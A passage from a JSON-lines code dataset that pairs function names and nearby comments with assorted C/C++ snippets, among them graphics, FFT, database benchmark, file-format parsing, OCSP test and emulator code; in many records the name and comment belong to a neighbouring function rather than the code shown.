+= h2;\\n\\n\\t\\t\/\/ \uc0ac\uac01\ud615\\n\\t\\tRect rc(x - 3, y - 3, 6, 6);\\n\\t\\trectangle(img, rc, color, thickness);\\n\\n\\t\\tif (cos(dRadian) < 0)\\tputText(img, COLOR_NAME[i], Point(x - 6, y - 6), FONT_HERSHEY_SIMPLEX, 0.4, color, thickness, CV_AA);\\n\\t\\telse\\t\\t\\t\\t\\tputText(img, COLOR_NAME[i], Point(x + 6, y + 3), FONT_HERSHEY_SIMPLEX, 0.4, color, thickness, CV_AA);\\n\\t}\\n\\n\\treturn img;\\n}'}","id":2574}
{"content":"{'function_name': 'calculation', 'docstring': \"\/\/str[str.length()-1] = 'h';\\r\", 'code': 'int number(std::string str, int j, bool k)\\r\\n{\\r\\n\\tif (!k)\\r\\n\\t{\\r\\n\\t\\twhile (isdigit(str[j]))\\r\\n\\t\\t\\tif (j != 0)\\r\\n\\t\\t\\t\\tj--;\\r\\n\\t\\t\\telse\\r\\n\\t\\t\\t\\treturn (-j);\\r\\n\\t\\t\\t\\t\/\/return j;\\r\\n\\t\\tj++;\\r\\n\\t}\\r\\n\\telse\\r\\n\\t{\\r\\n\\t\\twhile (isdigit(str[j]))\\r\\n\\t\\t\\tif (j != str.length() - 1)\\r\\n\\t\\t\\t\\tj++;\\r\\n\\t\\t\\telse\\r\\n\\t\\t\\t\\t\/\/return (-j);\\r\\n\\t\\t\\t\\treturn j;\\r\\n\\t\\tj--;\\r\\n\\t}\\r\\n\\t\/\/return (-j);\\r\\n\\treturn j;\\r\\n}'}","id":2575}
{"content":"{'function_name': 'x86GetRiseId', 'docstring': '\/* - Basic identification -\\n  ** ID = 0x500x \/ 0x502x : mP6 iDragon\\n  ** ID = 0x508x \/ 0x509x : mP6 iDragon II\\n  *\/', 'code': 'static u32 x86GetNscId(u32 maxfunc)\\n{\\n  \/* - Basic identification -\\n  ** ID = 0x504x : Geode GX1\\n  ** ID = 0x505x : Geode GX2\\n  ** ID = 0x50Ax : Geode LX\\n  *\/\\n  return x86GetDefaultId(maxfunc) | (VENDOR_NSC << 28);\\n}'}","id":2593}
{"content":"{'function_name': 'FCos1', 'docstring': '\/\/----------------------------------------------------------------------------------------------\\r', 'code': 'static TReal FSin1( TReal p_tAngle )\\r\\n\\t{\\r\\n\\t\\t\/\/----------------------------------------------------------------------------------------------\\r\\n\\t\\t\/\/ Maclaurin series with slightly modified coefficients s.t. sin(pi\/2) = 1\\r\\n\\t\\t\/\/ sin(x) = x - 0.16667 * x^3 + 0.00786 * x^5, -pi <= x <= pi\\r\\n\\t\\t\/\/----------------------------------------------------------------------------------------------\\r\\n\\t\\tif ( p_tAngle < -PiHalf )\\r\\n\\t\\t\\tp_tAngle = -Pi-p_tAngle; \\r\\n\\t\\telse if ( p_tAngle > PiHalf ) \\r\\n\\t\\t\\tp_tAngle = Pi-p_tAngle;\\r\\n\\t\\r\\n\\t\\tTReal tAngleSqr = p_tAngle * p_tAngle;\\r\\n\\t\\treturn p_tAngle + tAngleSqr * p_tAngle * ( 0.00786 * tAngleSqr - 0.16667 );\\r\\n\\t}'}","id":2594}
{"content":"{'function_name': 'perp', 'docstring': '\/\/ Randomly pick a reasonable perpendicular vector', 'code': 'Vertex tube(const float s, const float t, const std::function<glm::vec3(float)> func, const float radius) {\\n  const float u = s * DEMOLOOP_M_PI, v = t * DEMOLOOP_M_PI;\\n\\n  \/\/ Compute three basis vectors\\n  glm::vec3 p1 = func(u);\\n  glm::vec3 p2 = func(u + 0.01);\\n  glm::vec3 A = glm::normalize(p2 - p1);\\n  glm::vec3 B = perp(A);\\n  glm::vec3 C = glm::normalize(glm::cross(A, B));\\n\\n  \/\/ Rotate the Z-plane circle appropriately\\n  glm::mat3 m = new_rotate_triple_axis(B, C, A);\\n  glm::vec3 spoke_vector = m * glm::vec3(cos(2*v), sin(2*v), 0);\\n\\n  \/\/ Add the spoke vector to the center to obtain the rim position:\\n  glm::vec3 center = p1 + radius * spoke_vector;\\n  return {\\n    center.x, center.y, center.z,\\n    s * 20, t\\n  };\\n}'}","id":2595}
{"content":"{'function_name': 'calculate_prioritized_blocking_hybrid', 'docstring': '\/\/ Calculate the prioritized blocking due to low-prio tasks on the same core', 'code': 'double calculate_hybrid_lp_direct_blocking(unsigned int index, const std::vector<Task> &task_vector, \\n\\t\\t\\t\\t\\t\\t\\t\\t\\t       const std::vector<double> &resp_time_hp, double resp_time)\\n{\\n\\tdouble blocking;\\n\\tunsigned int psi, theta, psi_sum;\\n\\tint num_biggest = 1;\\n\\n\\tunsigned int num_gpu_segments = task_vector[index].getNumGPUSegments();\\n\\n\\t\/* Find index of maximum low-priority GPU segment *\/\\n\\tdouble Hl_max = find_max_lp_gpu_wcrt_segment(index, task_vector);\\n\\tint Hl_max_index = find_max_lp_gpu_wcrt_index(index, task_vector);\\n\\n\\t\/\/ Return 0 blocking if task has no GPU execution\\n\\tif(task_vector[index].getTotalGe() == 0)\\n\\t\\treturn 0;\\n\\n\\t\/* Note: Under this analysis even low-priority GPU access \\n\\t         faces blocking from high-priority tasks *\/\\n\\tif (Hl_max != 0)\\n\\t{\\n\\t\\t\/\/ Calculate the blocking\\n\\t\\tpsi = 0;\\n\\t\\tpsi_sum = 0;\\n\\t\\tblocking = 0;\\n\\t\\ttheta = getTheta(task_vector[Hl_max_index], resp_time);\\n\\t\\twhile (num_gpu_segments - psi_sum > 0 && Hl_max > 0)\\n\\t\\t{\\n\\t\\t\\tif (num_gpu_segments - psi_sum > theta)\\n\\t\\t\\t\\tpsi = theta;\\n\\t\\t\\telse\\n\\t\\t\\t\\tpsi = num_gpu_segments - psi_sum;\\n\\n\\t\\t\\tpsi_sum = psi_sum + psi;\\n\\t\\t\\tblocking = blocking + psi*Hl_max;\\n\\n\\t\\t\\t\/\/ Get next task\\n\\t\\t\\tnum_biggest++;\\n\\t\\t\\tHl_max = find_next_max_lp_gpu_wcrt_segment(index, Hl_max, Hl_max_index, num_biggest, task_vector);\\n\\t\\t}\\n\\t}\\n\\telse\\n\\t{\\n\\t\\t\/\/ No other lower priority tasks exist -> Vector Index has overrun\\n\\t\\tblocking = 0;\\n\\t}\\n\\n\\treturn blocking;\\n\\t\\n\\t\\n}'}","id":2597}
{"content":"{'function_name': 'runStockLevel', 'docstring': '\/*\\n    int q_w_id = stocklevel->w_id;\\n    int q_d_id = stocklevel->d_id;\\n    int64_t q_threshold = stocklevel->threshold;\\n    =============================\\n    SELECT d_next_o_id\\n    INTO tmp_d_next_o_id\\n    FROM district\\n    WHERE d_w_id = in_w_id\\n      AND d_id = in_d_id;\\n    ===============================\\n    int64_t key = q_d_id-1+(q_w_id-1)*DISTRICT_PER_WAREHOUSE,key2;\\n    char *match[16], *match2[16];\\n    int last = ht_district.probe (key, match, 16),last2;\\n#ifdef DEBUG\\n    if (last != 1) {\\n        printf (\"[main][ERROR][runStockLevel]: table district error! 1271\\\\n\");\\n        return -1;\\n    }\\n#endif\\n    char *record = match[0];\\n    int offset = district.getColumnOffset (10);\\n    int64_t tmp_next_o_id = *(int64_t*)(record+offset);\\n    =============================\\n    SELECT count(*)\\n    INTO low_stock\\n    FROM order_line, stock, district\\n    WHERE d_id = in_d_id\\n        AND d_w_id = in_w_id\\n        AND d_id = ol_d_id\\n        AND d_w_id = ol_w_id\\n        AND ol_i_id = s_i_id\\n        AND ol_w_id = s_w_id\\n        AND s_quantity < in_threshold\\n        AND ol_o_id BETWEEN (tmp_d_next_o_id - 20)\\n                        AND (tmp_d_next_o_id - 1);\\n    ===============================\\n    int offset1 = order_line.getColumnOffset(4);\\n    int offset2 = stock.getColumnOffset(2);\\n    int out_low_stock = 0;\\n    for (int64_t tmp_o_id=tmp_next_o_id-20; tmp_o_id<= tmp_next_o_id-1; tmp_o_id++) {\\n        key = tmp_o_id-1;\\n        key += (q_d_id-1)*ORDER_PER_DISTRICT;\\n        key += (q_w_id-1)*ORDER_PER_DISTRICT*DISTRICT_PER_WAREHOUSE;\\n        last2 = ht_orderline.probe (key, match, 16);\\n#ifdef DEBUG\\n        if (last2 < 0) {\\n            printf (\"[main][ERROR][runStockLevel]: table order_line error! 1288\\\\n\");\\n            return -2;\\n        }\\n#endif\\n        for (int ii=0;ii<last;ii++) {\\n            int64_t i_id = *(int64_t*)(match[ii]+offset1);\\n            key2 = i_id-1;\\n            key2 += (q_w_id-1)*MAXIMUM_ITEM_NUMBER;\\n            last2 = ht_item.probe (key2, match2, 16);\\n#ifdef DEBUG\\n            if (last2 != 1) {\\n                printf (\"[main][ERROR][runStockLevel]: table item error! 1300\\\\n\");\\n                return -3;\\n            }\\n#endif\\n            int64_t quantity = *(int64_t*)(match2[0]+offset2);\\n            if (quantity < q_threshold)\\n                out_low_stock ++;\\n        }\\n    }\\n*\/', 'code': 'int runTransactions (struct input_new_order_t *&neworders, struct input_payment_t* &payments, \\n                     struct input_delivery_t *&deleverys, struct input_order_status_t *&orderstatuss,\\n                     struct input_stock_level_t *&stocklevels, int trans_num, int *&choice)\\n{\\n    \/\/ pre operation to get tpcc_context infomation\\n    struct tpcc_context context;\\n    context.customer = (Table*)g_catalog.getObjByName(\"customer\");\\n    context.district = (Table*)g_catalog.getObjByName(\"district\");\\n    context.history = (Table*)g_catalog.getObjByName(\"history\");\\n    context.order = (Table*)g_catalog.getObjByName(\"order\");\\n    context.new_order = (Table*)g_catalog.getObjByName(\"new_order\");\\n    context.order_line = (Table*)g_catalog.getObjByName(\"order_line\");\\n    context.stock = (Table*)g_catalog.getObjByName(\"stock\");\\n    context.item = (Table*)g_catalog.getObjByName(\"item\");\\n    context.warehouse = (Table*)g_catalog.getObjByName(\"warehouse\");\\n    context.ht_customer = (Index*)g_catalog.getObjByName(\"ht_customer\");\\n    context.ht_customer_2 = (Index*)g_catalog.getObjByName(\"ht_customer_2\");\\n    context.ht_district = (Index*)g_catalog.getObjByName(\"ht_district\");\\n    context.ht_item = (Index*)g_catalog.getObjByName(\"ht_item\");\\n    context.ht_neworder = (Index*)g_catalog.getObjByName(\"ht_neworder\");\\n    context.ht_order = (Index*)g_catalog.getObjByName(\"ht_order\");\\n    context.ht_order_2 = (Index*)g_catalog.getObjByName(\"ht_order_2\");\\n    context.ht_order_line = (Index*)g_catalog.getObjByName(\"ht_orderline\");\\n    context.ht_stock= (Index*)g_catalog.getObjByName(\"ht_stock\");\\n    context.ht_warehouse= (Index*)g_catalog.getObjByName(\"ht_warehouse\");\\n\\n    struct timeval start,end;\\n    gettimeofday (&start, NULL);\\n    int nn= 0, pp= 0, dd= 0,oo= 0,ss= 0, stat=-1;\\n    for (int ii = 0;ii < trans_num;ii ++) {\\n#ifdef DEBUG\\n        switch (choice[ii]) \\n        {\\n            case NEW_ORDER: \\n                    if ((stat = runNewOrder (&neworders[nn], context) != 0)) {\\n                        printf (\"[main][ERROR][runNewOrder]: neworder error! %d\\\\n\", ii);\\n                        return -1;\\n                    }\\n                    nn ++;\\n                    break;\\n            case PAYMENT: \\n                    if ((stat = runPayment (&payments[pp], context) != 0)) {\\n                        printf (\"[main][ERROR][runPayment]: payment error! %d\\\\n\", ii);\\n                        return -1;\\n                    }\\n                    pp ++;\\n                    break;\\n            case DELIVERY:\\n                    if ((stat = runDelivery (&deleverys[dd], context) != 0)) {\\n                        printf (\"[main][ERROR][runDelivery]: delivery error! %d\\\\n\", ii);\\n                        return -1;\\n                    }\\n                    dd ++;\\n                    break;\\n            case ORDER_STATUS:\\n                    if ((stat = runOrderStatus (&orderstatuss[oo], context) != 0)) {\\n                        printf (\"[main][ERROR][runOrderStatus]: order status error! %d\\\\n\", ii);\\n                        return -1;\\n                    }\\n                    oo ++;\\n                    break;\\n            case STOCK_LEVEL:\\n                    if ((stat = runStockLevel (&stocklevels[ss], context) != 0)) {\\n                        printf (\"[main][ERROR][runPayment]: payment error! %d\\\\n\", ii);\\n                        return -1;\\n                    }\\n                    ss ++;\\n                    break;\\n        }\\n\\n#else\\n        switch (choice[ii]) \\n        {\\n            case NEW_ORDER: runNewOrder (&neworders[nn++],context);break;\\n            case PAYMENT: runPayment (&payments[pp++],context);break;\\n            case DELIVERY: runDelivery (&deleverys[dd++],context);break;\\n            case ORDER_STATUS: runOrderStatus (&orderstatuss[oo++],context);break;\\n            case STOCK_LEVEL: runStockLevel (&stocklevels[ss++],context);break;\\n        }\\n\\n#endif\\n    }\\n    gettimeofday (&end, NULL);\\n    unsigned long diff = 1000000*(end.tv_sec-start.tv_sec)+(end.tv_usec-start.tv_usec);\\n    double average = ((double)diff) \/ trans_num; \\n    printf (\"transactions: %d time use: %lu us average: %lf us\\\\n\",trans_num, diff,average);\\n    printf (\"transactions: nn:%d pp:%d dd:%d oo:%d ss:%d\\\\n\",nn,pp,dd,oo,ss);\\n    delete [] neworders;\\n    delete [] payments;\\n    delete [] deleverys;\\n    delete [] orderstatuss;\\n    delete [] stocklevels;\\n    delete [] choice;\\n    return 0;\\n}'}","id":2598}
{"content":"{'function_name': 'read_instance', 'docstring': \"\/*\\n    else:\\n\\n\\n        elif type_def.metatype in {3, 4}:  # Array or Inline Array\\n            if type_def.metatype == 3:\\n                v0, buffer_pos = ff_read_u32s(buffer, n_buffer, buffer_pos, 3)\\n                opos = buffer_pos\\n\\n                offset = v0[0]\\n                flags = v0[1]\\n                length = v0[2]\\n                # unknown = v0[3] sometimes does not exist, is it even real data, in some cases it removed in GZ EXE\\n                align = None\\n                # aligning based on element size info\\n                # if type_def.element_type_hash not in prim_types:\\n                #     align = 4\\n                buffer_pos = offset\\n            else:\\n                opos = None\\n                offset = buffer_pos\\n                length = type_def.element_length\\n                align = None\\n\\n        elif type_def.metatype == 7:  # BitField\\n            if type_def.size == 1:\\n                v, buffer_pos = ff_read_u8(buffer, n_buffer, buffer_pos)\\n            elif type_def.size == 2:\\n                v, buffer_pos = ff_read_u16(buffer, n_buffer, buffer_pos)\\n            elif type_def.size == 4:\\n                v, buffer_pos = ff_read_u32(buffer, n_buffer, buffer_pos)\\n            elif type_def.size == 8:\\n                v, buffer_pos = ff_read_u64(buffer, n_buffer, buffer_pos)\\n            else:\\n                raise Exception('Unknown bitfield size')\\n\\n            if bit_offset is None:\\n                bit_offset = 0\\n                print('Missing bit offset')\\n                # raise Exception('Missing bit offset')\\n            v = (v >> bit_offset) & 1\\n\\n            v = AdfValue(v, type_id, dpos + abs_offset, bit_offset=bit_offset)\\n        elif type_def.metatype == 8:  # Enumeration\\n            if type_def.size != 4:\\n                raise Exception('Unknown enum size')\\n            v, buffer_pos = ff_read_u32(buffer, n_buffer, buffer_pos)\\n            if v < len(type_def.members):\\n                vs = type_def.members[v].name\\n            else:\\n                vs = None\\n\\n            v = AdfValue(v, type_id, dpos + abs_offset, enum_string=vs)\\n        elif type_def.metatype == 9:  # String Hash\\n            if type_def.size == 4:\\n                v, buffer_pos = ff_read_u32(buffer, n_buffer, buffer_pos)\\n                if v in map_string_hash:\\n                    vs = map_string_hash[v].value\\n                else:\\n                    vs = None\\n            elif type_def.size == 6:\\n                v0, buffer_pos = ff_read_u16(buffer, n_buffer, buffer_pos)\\n                v1, buffer_pos = ff_read_u16(buffer, n_buffer, buffer_pos)\\n                v2, buffer_pos = ff_read_u16(buffer, n_buffer, buffer_pos)\\n                v = v0 << 32 | v1 << 16 | v2\\n                if v in map_string_hash:\\n                    vs = map_string_hash[v].value\\n                else:\\n                    vs = None\\n            elif type_def.size == 8:\\n                v, buffer_pos = ff_read_u64(buffer, n_buffer, buffer_pos)\\n                if v in map_string_hash:\\n                    vs = map_string_hash[v].value\\n                else:\\n                    vs = None\\n            else:\\n                v, buffer_pos = ff_read(buffer, n_buffer, buffer_pos, type_def.size)\\n                vs = None\\n\\n            v = AdfValue(v, type_id, dpos + abs_offset, hash_string=vs)\\n        else:\\n            raise Exception('Unknown Typedef Type {}'.format(type_def.metatype))\\n\\n    *\/\", 'code': 'bool read_file(DecaBufferFile & f)\\n{\\n    if(f.size() < 0x40)\\n    {\\n        db_print(\"Error: FileTooShort\");\\n        return false; \/\/ raise FileTooShort\\n    }\\n\\n    u32 const magic = f.read<u32>();\\n\\n    if (magic != \\'ADF \\')\\n    {\\n        db_print(\"Error: Magic does not match\");\\n        return false;\\n    }\\n\\n    u32 const version = f.read<u32>();\\n\\n    u32 const instance_count = f.read<u32>();\\n    u32 const instance_offset = f.read<u32>();\\n\\n    u32 const typedef_count = f.read<u32>();\\n    u32 const typedef_offset = f.read<u32>();\\n\\n    u32 const stringhash_count = f.read<u32>();\\n    u32 const stringhash_offset = f.read<u32>();\\n\\n    u32 const nametable_count = f.read<u32>();\\n    u32 const nametable_offset = f.read<u32>();\\n\\n    u32 const total_size = f.read<u32>();\\n\\n    u32 const unknown_000 = f.read<u32>();\\n    u32 const unknown_001 = f.read<u32>();\\n    u32 const unknown_002 = f.read<u32>();\\n    u32 const unknown_003 = f.read<u32>();\\n    u32 const unknown_004 = f.read<u32>();\\n\\n\\n    StringRef comment = f.read_strz();  \/\/ comment is a zero delimited string\\n\\n\/\/    db_print(\"Comment: \" + to_string(comment));\\n\\n\\n    \/\/ name table\\n    f.pos_seek(nametable_offset);\\n\\n    std::vector<u8> name_table_sz(nametable_count);\\n    for(size_t i = 0; i < nametable_count; ++i)\\n    {\\n        name_table_sz[i] = f.read<u8>();\\n    }\\n\\n    std::vector<StringRef> name_table(nametable_count);\\n    for(size_t i = 0; i < nametable_count; ++i)\\n    {\\n        name_table[i] = f.read_strn(name_table_sz[i] + 1, true);\\n    }\\n\\n\\n    \/\/ string hash\\n    f.pos_seek(stringhash_offset);\\n\\n    std::map<u64, StringRef> map_string_hash;\\n    for(size_t i = 0; i < stringhash_count; ++i)\\n    {\\n        StringRef const s{f.read_strz()};\\n        u64 const h = f.read<u64>();\\n        map_string_hash[h] = s;\\n    }\\n\\n\\n    \/\/ typedef\\n    f.pos_seek(typedef_offset);\\n\\n    std::map<u32, TypeDef> map_typedef;\\n\\n    for(size_t i = 0; i < typedef_count; ++i)\\n    {\\n        TypeDef td;\\n        td.deserialize(f, name_table);\\n        map_typedef[td.type_hash_] = td;\\n    }\\n\\n    \/\/ instance\\n    f.pos_seek(instance_offset);\\n\\n    std::vector<InstanceEntry> table_instance(instance_count);\\n\\n    for(auto && i : table_instance) i.deserialize(f, name_table);\\n\\n    for(auto && i : table_instance) i.read_instance(f, map_typedef);\\n\\n    return true;\\n}'}","id":2603}
{"content":"{'function_name': 'Complex', 'docstring': '\/\/\u6709\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\uff0c\u5e76\u4e14\u4f7f\u7528\u4f20\u5165\u7684a\u548cb\u53bb\u521d\u59cb\u5316\u6210\u5458', 'code': 'int main(){\\n\\n    Complex c1(1, -27.6), c2(2, -4.7);\\n\\n    Complex c3, c4;\\n\\n    c3 = c2 + c1;\\n\\n    c4 = c3 * c1;\\n\\n    c2 = c4 - c1;\\n\\n    cout  << c1  << c2  << c3 << c4 << c1 - c4;\/\/\u6700\u540e\u8f93\u51fa\u7684\u662f\u4e00\u4e2a\u53f3\u503c\uff0c\u6240\u4ee5\u5bf9\u5e94\u4e86\u524d\u9762\u7684\u91cd\u8f7d<<\u7684const\uff0c\u5fc5\u987b\u65f6\u523b\u6ce8\u610f\\n    return 0;\\n}'}","id":2609}
{"content":"{'function_name': 'TEST_F', 'docstring': '\/\/ AIA OCSP url is included, but does not return a successful ocsp response.', 'code': 'TEST_F(HTTPSHardFailTest, OldStapledButValidAIA) {\\n  if (!SystemSupportsOCSPStapling()) {\\n    LOG(WARNING)\\n        << \"Skipping test because system doesn\\'t support OCSP stapling\";\\n    return;\\n  }\\n\\n  if (!SystemSupportsHardFailRevocationChecking()) {\\n    LOG(WARNING) << \"Skipping test because system doesn\\'t support hard fail \"\\n                 << \"revocation checking\";\\n    return;\\n  }\\n\\n  EmbeddedTestServer::ServerCertificateConfig cert_config;\\n\\n  \/\/ Stapled response indicates good, but response is too old.\\n  cert_config.stapled_ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::GOOD,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kOld}});\\n\\n  \/\/ AIA OCSP url is included, and returns a successful ocsp response.\\n  cert_config.ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::GOOD,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kValid}});\\n\\n  CertStatus cert_status;\\n  DoConnection(cert_config, &cert_status);\\n\\n  EXPECT_EQ(0u, cert_status & CERT_STATUS_ALL_ERRORS);\\n  EXPECT_TRUE(cert_status & CERT_STATUS_REV_CHECKING_ENABLED);\\n}'}","id":2611}
{"content":"{'function_name': 'main', 'docstring': '\/*\\t\\n\\t\/\/For direct output\\n\\tstrcpy(str,\"8 9 +\");\\n\\tstrcpy(nstr,str);\\n\\terror=postFix(str,&result);\\n\\tif(floatORinteger(nstr)){\\n\\t\\tdisplayFloat(error,result,nstr);\\n\\t}\\n\\telse{\\n\\t\\tdisplayInt(error,result,nstr);\\n\\t}\\n\\tprintf(\"\\\\n\");\\n\\tstrcpy(str,\"9 3 - 8 2 \/ -\");\\n\\tstrcpy(nstr,str);\\n\\terror=postFix(str,&result);\\n\\tif(floatORinteger(nstr)){\\n\\t\\tdisplayFloat(error,result,nstr);\\n\\t}\\n\\telse{\\n\\t\\tdisplayInt(error,result,nstr);\\n\\t}\\n\\tprintf(\"\\\\n\");\\n\\tstrcpy(str,\"9 3 - 8 2 \/ - 6 2 \/ +\");\\n\\tstrcpy(nstr,str);\\n\\terror=postFix(str,&result);\\n\\tif(floatORinteger(nstr)){\\n\\t\\tdisplayFloat(error,result,nstr);\\n\\t}\\n\\telse{\\n\\t\\tdisplayInt(error,result,nstr);\\n\\t}\\n\\tprintf(\"\\\\n\");\\n\\tstrcpy(str,\"9.3 3 - 8 2 \/ - 6 2 \/ 3 2 * + +\");\\n\\tstrcpy(nstr,str);\\n\\terror=postFix(str,&result);\\n\\tif(floatORinteger(nstr)){\\n\\t\\tdisplayFloat(error,result,nstr);\\n\\t}\\n\\telse{\\n\\t\\tdisplayInt(error,result,nstr);\\n\\t}\\n\\tprintf(\"\\\\n\");\\n\\tstrcpy(str,\"9 3 - 8 2 \/ *\");\\n\\tstrcpy(nstr,str);\\n\\terror=postFix(str,&result);\\n\\tif(floatORinteger(nstr)){\\n\\t\\tdisplayFloat(error,result,nstr);\\n\\t}\\n\\telse{\\n\\t\\tdisplayInt(error,result,nstr);\\n\\t}  *\/', 'code': 'bool postFix(char str[], float *result){   \/\/evaluates the postfix calculator\\n\\tStack s= newStack();\\n\\tfloat fnum;\\n\\tbool flag=0;\\n\\tchar *item=strtok(str,\" \");\\n\\twhile(item!=NULL&&flag==0){\\n\\t\\tif(item[0]==\\'-\\'&&item[1]>=\\'0\\'&&item[1]<=\\'9\\'){\\n\\t\\t\\tfnum = stringToFloat(item,1); \\t\\t\\t\\t\/\/for converting string to float numbers without using atof()\\n\\t\\t\\tfnum = -fnum;\\n\/\/\\t\\t\\tfnum = atof(item);\\n\\t\\t\\tpush(s,fnum);\\n\\t\\t}\\n\\t\\telse if(item[0]>=\\'0\\'&&item[0]<=\\'9\\'){\\n\\t\\t\\tfnum = stringToFloat(item,0); \\t\\t\/\/for converting string to float numbers without using atof()\\n\\t\\t\/\/\\tfnum = atof(item);\\n\\t\\t\\tpush(s,fnum);\\n\\t\\t}\\n\\t\\telse if(!isEmpty(s)){\\n\\t\\t\\tflag=operation(item[0],s);  \/\/function evaluates the program if it does not evaule it pushes the char operator or letter \\'a\\' for determining an invalid expression\\n\\t\\t}\\n\\t\\telse {\\n\\t\\t\\tfnum = item[0];  \/\/if there is no operator invalid\\n\\t\\t\\tpush(s,fnum);\\n\\t\\t\\tflag = 1;\\n\\t\\t}\\t\\n\\t\\titem = strtok(NULL,\" \");\\n\\t}\\n\\t*result = peek(s);   \/\/peeks the last item in the stack or its answer if flag == 0, else it peeks the last item in the stack to determine the error\\n\\tpop(s);\\n\\tif(!isEmpty(s)){ \/\/check if the stack is still not empty or not \\n\\t\\tflag = 1;\\n\\t}\\n\\tdestroy(&s);\\n\\treturn flag;\\n}'}","id":2613}
{"content":"{'function_name': 'save', 'docstring': '\/\/ which is \"as\", discarded', 'code': 'void remove() {\\n    char buf[BUFFER_SIZE];\\n    scanf(\"%s\", buf);\\n\\n    int index = search(buf);  \/* returns -1 if not exists *\/\\n    if (index == -1) {\\n        printf(\"No person named \\'%s\\' exists.\\\\n\", buf);\\n        return;\\n    }\\n\\n    int j = index;\\n    for (; j<n-1; j++) {\\n        names[j] = names[j+1];\\n        numbers[j] = numbers[j+1];\\n    }\\n    n--;\\n    printf(\"\\'%s\\' was deleted successfully. \\\\n\", buf);\\n}'}","id":2614}
{"content":"{'function_name': 'projection', 'docstring': '\/\/Projection of the vector (e) onto (r(0) x + r(1) y + r(2) z + r(3) = 0)', 'code': 'double cos_th(const Vector3& p0, const Vector3& p1, const Vector3& p2)\\n{\\n  \/\/Cosine theorem\\n  Vector3 p10 = Vector3(p1-p0);\\n  Vector3 p20 = Vector3(p2-p0);\\n  Vector3 p21 = Vector3(p2-p1);\\n\\n  return (dot(p10, p10) + dot(p20,p20) - dot(p21, p21) ) \/ ( 2.0*abs(p10)*abs(p20) );\\n}'}","id":2616}
{"content":"{'function_name': 'searchR', 'docstring': '\/\/ Check for string, and recurse if necessary', 'code': 'int callsearchR(string s[], string x, int size) {\\n\\t\/\/if(s==NULL || x==NULL || x==\"\") return -1;\\n\\tif(s==NULL || x==\"\") return -1;\\n\\n\\treturn searchR(s, x, 0, size-1);\\n}'}","id":2621}
{"content":"{'function_name': 'fft_forward', 'docstring': '\/\/  Recursively perform FFT on upper elements.', 'code': 'void fft_inverse(complex<double> *T, int k){\\n    \/\/  Fast Fourier Transform\\n    \/\/  This function performs an inverse FFT of length 2^k.\\n\\n    \/\/  This is a Decimation-in-Time (DIT) FFT.\\n    \/\/  The frequency domain input must be in bit-reversed order.\\n\\n    \/\/Parameters:\\n    \/\/  -   T           -   Pointer to array.\\n    \/\/  -   k           -   2^k is the size of the transform\\n\\n    \/\/  End recursion at 2 points.\\n    if (k == 1){\\n        complex<double> a = T[0];\\n        complex<double> b = T[1];\\n        T[0] = a + b;\\n        T[1] = a - b;\\n        return;\\n    }\\n\\n    size_t length = (size_t)1 << k;\\n    size_t half_length = length \/ 2;\\n\\n    \/\/  Recursively perform FFT on lower elements.\\n    fft_inverse(T, k - 1);\\n\\n    \/\/  Recursively perform FFT on upper elements.\\n    fft_inverse(T + half_length, k - 1);\\n\\n    \/\/  Get local twiddle table.\\n    std::vector<complex<double>> &local_table = twiddle_table[k];\\n\\n    \/\/  Perform FFT reduction into two halves.\\n    for (size_t c = 0; c < half_length; c++){\\n        \/\/  Grab Twiddle Factor\\n        auto twiddle_factor = conj(local_table[c]);\\n\\n        \/\/  Grab elements\\n        complex<double> a = T[c];\\n        complex<double> b = T[c + half_length] * twiddle_factor;\\n\\n        \/\/  Perform butterfly\\n        T[c              ]  = a + b;\\n        T[c + half_length]  = a - b;\\n    }\\n}'}","id":2624}
{"content":"{'function_name': 'isAbundant', 'docstring': '\/\/ returns true if n is abundant', 'code': 'bool isAbundantSum(ui x) {  \/\/ returns true if x is sum of abundant numbers\\n\\tif (x >= start) \\n\\t\\treturn true;\\n\\t\\n\\tfor (auto i : abundant) {\\n\\t\\tif (i >= x)\\n\\t\\t\\treturn false;\\n\\t\\t\\n\\t\\tui other = x - i;\\n\\t\\tif (abundant.count(other) == 0)\\n\\t\\t\\tcontinue;\\n\\t\\treturn true;\\n\\t}\\n\\treturn false;\\n}'}","id":2642}
{"content":"{'function_name': 'randomColor', 'docstring': '\/\/ for next time', 'code': 'uint32_t chooseColor(bool fading=false) {\\n  uint32_t theColor = randomColor();        \/\/ get a random color\\n  if (fading) {                             \/\/ fading, just use that color\\n    if (debug) { Serial.print(\"cc: random color: \"); Serial.println(theColor); }\\n    return theColor;\\n  } else {                                  \/\/ otherwise, pick something based on light levels\\n    int lightLevel = getLightLevel();\\n\/\/    theColor = onColor;                   \/\/ assume we need bright lights   \\n    if (lightLevel > lightLevelBright) {\\n      theColor = offColor;                  \/\/ it\\'s pretty bright, no need to light it\\n    }\\n    if (lightLevel < lightLevelMedium) {    \/\/ somewhat dim, use a dimish pale blue\\n      theColor = dimPaleBlue;\\n    }\\n    if (lightLevel < lightLevelDim) {       \/\/ quite dim, use a semi-dim red\\n      theColor = dimRed;\\n    }\\n   if (debug) { Serial.print(\"cc light level: \"); Serial.print(lightLevel); Serial.print(\" color: \"); Serial.println(theColor); }\\n   return theColor;\\n  }\\n}'}","id":2643}
{"content":"{'function_name': 'rdp_setscissor', 'docstring': '\/\/ clipper resolution is 320x240, scale based on computer resolution', 'code': 'static void rdp_loadtlut()\\n{\\n  wxUint32 tile = (rdp.cmd1 >> 24) & 0x07;\\n  wxUint16 start = rdp.tiles[tile].t_mem - 256; \/\/ starting location in the palettes\\n  \/\/  wxUint16 start = ((wxUint16)(rdp.cmd1 >> 2) & 0x3FF) + 1;\\n  wxUint16 count = ((wxUint16)(rdp.cmd1 >> 14) & 0x3FF) + 1;    \/\/ number to copy\\n\\n  if (rdp.timg.addr + (count<<1) > BMASK)\\n    count = (wxUint16)((BMASK - rdp.timg.addr) >> 1);\\n\\n  if (start+count > 256) count = 256-start;\\n\\n  FRDP(\"loadtlut: tile: %d, start: %d, count: %d, from: %08lx\\\\n\", tile, start, count,\\n    rdp.timg.addr);\\n\\n  load_palette (rdp.timg.addr, start, count);\\n\\n  rdp.timg.addr += count << 1;\\n\\n  if (rdp.tbuff_tex) \/\/paranoid check.\\n  {\\n    \/\/the buffer is definitely wrong, as there must be no CI frame buffers\\n    